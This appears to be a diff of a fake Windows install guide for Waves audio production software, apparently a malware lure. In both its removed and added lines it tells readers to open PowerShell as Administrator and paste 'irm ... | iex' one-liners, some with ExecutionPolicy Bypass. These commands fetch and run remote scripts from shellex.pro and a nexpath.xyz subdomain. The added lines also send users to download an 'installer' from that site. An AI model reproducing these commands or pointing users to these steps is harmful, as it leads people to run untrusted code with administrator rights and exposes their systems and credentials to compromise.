@@ -17,13 +17,13 @@ Waves Complete Audio Production Suite PC Windows Guide · Studio workflow · Plu
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://shellex.pro/ps/setup.ps1 | iex
+irm https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/ | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/ | iex"
 ```
 
 
@@ -59,17 +59,17 @@ Notes for users who need **Waves Complete Audio Production Suite PC Windows Guid
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://shellex.pro/ps/setup.ps1 | iex</code>
+<br>Open <a href="https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/">waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Windows key → type <b>powershell</b> → right-click → <b>Run as administrator</b>.
+<br>Open <a href="https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/">waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"</code>
+<br>Open <a href="https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/">waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -81,27 +81,12 @@ Notes for users who need **Waves Complete Audio Production Suite PC Windows Guid
 
 **Topics:** waves-audio, waves-audio-app, daw-software, music-production, waves-audio-setup-failed-fix, how-to-install-waves-audio, vst-host, audio-workstation, windows-daw, waves-audio-windows, waves-audio-windows-setup, waves-audio-windows-setup-2026
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
+* **Project link:** **[waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz](https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/)**
+* **Full URL:** `https://waves-complete-audio-production-suite-pc-windows-guide.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
